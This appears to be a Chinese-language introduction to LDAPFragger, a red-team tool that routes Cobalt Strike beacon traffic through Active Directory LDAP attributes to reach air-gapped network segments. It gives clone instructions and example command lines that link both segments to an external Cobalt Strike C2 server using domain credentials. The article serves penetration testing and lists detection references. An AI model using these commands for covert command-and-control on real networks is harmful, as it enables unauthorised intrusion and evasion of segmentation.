## 关于LDAPFragger

LDAPFragger是一款功能强大的命令控制C&C工具，可以帮助广大研究人员使用用户属性和LDAP来路由Cobalt Strike信标数据。

在之前的一次针对组织内部网络的渗透测试过程中，我们遇到了物理分段网络。这些网络包含连接到同一活动目录域的工作站，但是只有一个网段可以连接到外网。为了使用Cobalt
Strike远程控制这两个网段中的工作站，我们构建了一个工具，该工具使用共享活动目录组件来构建通信通道。为此，该工具使用了针对活动目录的LDAP协议，并且能够有效地通过LDAP路由信标数据。

## 构建高级LDAP信道

下图显示的是信道建立的处理流程：

![](https://image.3001.net/images/20220509/1652104748_62791e2cf1171b08ffbf1.png!small)

## 依赖组件

该工具需要使用.NET 4.0进行编译，但理论上也可以使用其他版本的.NET Framework。

## 工具下载

广大研究人员可以使用下列命令将该项目源码克隆至本地：

    
    
    git clone https://github.com/fox-it/LDAPFragger.git

## 工具使用

    
    
    _     _              __
    
    | |   | |            / _|
    
    | | __| | __ _ _ __ | |_ _ __ __ _  __ _  __ _  ___ _ __
    
    | |/ _` |/ _` | '_ \|  _| '__/ _` |/ _` |/ _` |/ _ \ '__|
    
    | | (_| | (_| | |_) | | | | | (_| | (_| | (_| |  __/ |
    
    |_|\__,_|\__,_| .__/|_| |_|  \__,_|\__, |\__, |\___|_|
    
                  | |                   __/ | __/ |
    
                  |_|                  |___/ |___/
    
     
    
    Fox-IT - Rindert Kramer
    
     
    
    Usage:
    
         --cshost:  Cobalt Strike实例的IP地址或主机名
    
         --csport:  Cobalt Strike服务器的外部C2实例端口
    
         -u:        连接活动目录使用的用户名
    
         -p:        连接活动目录使用的密码
    
         -d:        活动目录域的FQDN
    
         --ldaps:    使用LDAPS代替LDAP
    
         -v:        Verbose输出模式
    
         -h:        显示工具帮助信息
    
     
    
    If no AD credentials are provided, integrated AD authentication will be used.

## 工具使用样例

![](https://image.3001.net/images/20220509/1652104780_62791e4c83a3436e0cd5f.png!small)

 **从网段A运行下列命令：**

    
    
    LDAPFragger --cshost <Cobalt Strike IP> --csport <External listener port>
    
     
    
    LDAPFragger --cshost <Cobalt Strike IP> --csport <External listener port> -u <username> -p <password> -d <domain FQDN>

 **从网段B运行下列命令：**

    
    
    LDAPFragger
    
     
    
    LDAPFragger -u <username> -p <password> -d <domain FQDN>

我们可以通过“--LDAPS”选项来启用LDAPS，此时常规的LDAP流量仍然会被加密。注意，此时默认的Cobalt Strike
Payload可能会被大多数AV捕捉到。

## 工具运行截图

![](https://image.3001.net/images/20220509/1652104825_62791e7995bd1314db4dd.png!small)

## 许可证协议

本项目的开发与发布遵循[MIT](https://github.com/fox-it/LDAPFragger/blob/master/LICENSE)开源许可证协议。

## 项目地址

 **LDAPFragger：** 【[ _GitHub传送门_](https://github.com/fox-it/LDAPFragger)】

## 参考资料

> [ _https://blog.fox-it.com/2020/03/19/ldapfragger-command-and-control-over-> ldap-attributes/_](https://blog.fox-it.com/2020/03/19/ldapfragger-command-> and-control-over-ldap-attributes/)
>
> [ _https://docs.microsoft.com/en-us/windows/win32/adschema/r-personal-> information_](https://docs.microsoft.com/en-> us/windows/win32/adschema/r-personal-information)
>
> [ _https://github.com/fox-> it/LDAPFragger/blob/master/LDAPChannel.ps1_](https://github.com/fox-> it/LDAPFragger/blob/master/LDAPChannel.ps1)
>
> [ _https://www.harmj0y.net/blog/powershell/command-and-control-using-active-> directory/_](https://www.harmj0y.net/blog/powershell/command-and-control-> using-active-directory/)
>
> [ _https://www.cobaltstrike.com/help-> externalc2_](https://www.cobaltstrike.com/help-externalc2)
>
> [ _https://support.microsoft.com/en-us/help/314980/how-to-configure-active-> directory-and-lds-diagnostic-event-> logging_](https://support.microsoft.com/en-us/help/314980/how-to-configure-> active-directory-and-lds-diagnostic-event-logging)
>
> [ _https://techcommunity.microsoft.com/t5/Microsoft-Defender-ATP/Hunting-> for-reconnaissance-activities-using-LDAP-search-> filters/ba-p/824726_](https://techcommunity.microsoft.com/t5/Microsoft-> Defender-ATP/Hunting-for-reconnaissance-activities-using-LDAP-search-> filters/ba-p/824726)

